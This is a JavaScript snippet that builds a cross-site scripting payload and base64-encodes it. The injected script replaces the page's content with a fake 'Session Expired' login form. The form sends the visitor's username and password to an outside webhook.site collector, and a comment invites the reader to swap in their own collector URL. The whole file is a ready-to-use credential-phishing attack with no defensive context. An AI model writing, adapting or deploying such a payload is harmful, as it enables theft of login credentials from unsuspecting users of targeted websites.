const maliciousScript = `
<script>
    // Create a hidden form that looks legitimate
    function createMaliciousForm() {
        const form = document.createElement('form');
        form.innerHTML = 
            '<div style="width: 300px; margin: 20px auto; padding: 20px; border: 1px solid #ccc;">' +
                '<h2>Session Expired</h2>' +
                '<p>Please re-enter your credentials</p>' +
                '<div style="margin: 10px 0;">' +
                    '<label>Username:</label><br>' +
                    '<input type="text" name="username" style="width: 100%;">' +
                '</div>' +
                '<div style="margin: 10px 0;">' +
                    '<label>Password:</label><br>' +
                    '<input type="password" name="password" style="width: 100%;">' +
                '</div>' +
                '<button type="submit" style="width: 100%; padding: 10px;">Login</button>' +
            '</div>';
        
        form.method = 'POST';
        // Replace with your webhook.site URL
        form.action = 'https://webhook.site/4f7cfc0a-492d-4ec4-8793-b75c0a960da0'; 
        
        // Replace entire body content
        document.body.innerHTML = '';
        document.body.appendChild(form);
    }

    // Execute immediately
    createMaliciousForm();
</script>
`;


console.log(btoa(maliciousScript));
